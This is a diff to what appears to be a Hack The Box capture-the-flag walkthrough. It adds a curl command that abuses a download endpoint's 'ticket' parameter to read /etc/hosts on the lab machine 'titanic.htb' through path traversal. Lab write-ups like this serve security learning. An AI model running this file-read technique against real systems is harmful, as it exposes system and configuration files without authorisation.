@@ -59,6 +59,10 @@ Read `/etc/hosts`
 
 ![image](https://github.com/user-attachments/assets/2c5d511c-ba55-4c23-88e9-dbe511d1827c)
 
+Or by using Curl
+
+    curl --path-as-is 'http://titanic.htb/download?ticket=/etc/hosts'
+
 ![image](https://github.com/user-attachments/assets/1cfb7600-e9eb-4e33-b328-486f4aaf510a)
 
 Add `dev` subdomain to `/etc/hosts` on our machine!
